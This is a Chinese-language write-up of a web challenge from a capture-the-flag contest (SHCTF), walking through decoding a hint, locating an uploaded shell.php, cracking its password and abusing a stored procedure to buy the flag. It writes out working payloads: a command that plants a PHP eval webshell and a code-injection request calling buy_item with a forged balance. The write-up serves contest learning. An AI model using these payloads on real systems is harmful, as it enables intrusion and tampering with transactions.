# The-third-SHCTF
放GitHub做个记录，复盘一下（其实是每道题都学一遍）

05_em_v_CFK

<img width="1445" height="870" alt="image" src="https://github.com/user-attachments/assets/87577f86-ea07-4df6-ac71-ebe626eb7d11" />


一个flag购买商店，然后看源码可以看到一段特别的注释：
5bvE5YvX5Ylt5YdT5Yvdp2uyoTjhpTujYPQyhXoxhVcmnT935L+P5cJjM2I05oPC5cvB55dR5Mlw6LTK54zc5MPa

这个可能还是得靠经验，是rot13加base64解码出来如下：

我上传了个shell.php, 带上show参数get小明的圣遗物吧

然后这里直接访问/shell.php?get显示404，因此可能存在前置路径，用dirsearch能够扫出来uploads,因此可以加上该路径后再进行访问如下：

<img width="956" height="536" alt="image" src="https://github.com/user-attachments/assets/54ee92c7-29e5-4a15-af5b-cef9ca146b91" />


把pass放到md5解密网站上出来就是114514，然后后面的cmd可以执行响应命令，可以构造webshell:

key=114514&cmd=echo '<?php @eval($_POST[1]);?>' > /var/www/html/1.php

写入成功后可以连接蚁剑，找到index.php,但是我们无法直接修改余额，因此可以先把该文件保存到本地删除再修改上传，发现可以，最后得到我们的flag

<img width="1547" height="551" alt="image" src="https://github.com/user-attachments/assets/02f75374-0246-4132-b778-8c293fd4be19" />


然后这里不连webshell的方法有点复杂，先是ls找文件，然后用：

cmd=find / -name "flag" 

也找不到，说明flag不在系统文件，很可能在数据库中，复现大佬的解题过程：

key=114514&cmd=base64 ../index.php 第一次知道这样的...

这里的核心在如下两行代码中：

$stmt = $pdo->prepare("CALL buy_item(?, ?)");

$stmt->execute([$target_id, $my_money]);

这里发现了一个关键的逻辑漏洞：
后端调用了一个名为 buy_item 的存储过程。传递的参数是 ($target_id, $my_money)。这里的 $my_money 是 PHP 变量。虽然正常用户只能是 3 块钱，但既然我们有了 Webshell，我们可以直接调用这个存储过程，并传入任意金额,构造的payload为：

key=114514&code=include('../connect.php');var_dump($pdo->query("CALL buy_item(3, 50)")->fetchAll());

原理：
include('../connect.php');：利用现成的文件建立数据库连接对象 $pdo，无需知道数据库密码。
CALL buy_item(3, 50)：手动调用存储过程，购买 ID 3 的商品，并欺骗数据库说我有 50 块钱。

<img width="2130" height="665" alt="image" src="https://github.com/user-attachments/assets/a3e676b5-803b-4558-b439-3fbfab690292" />


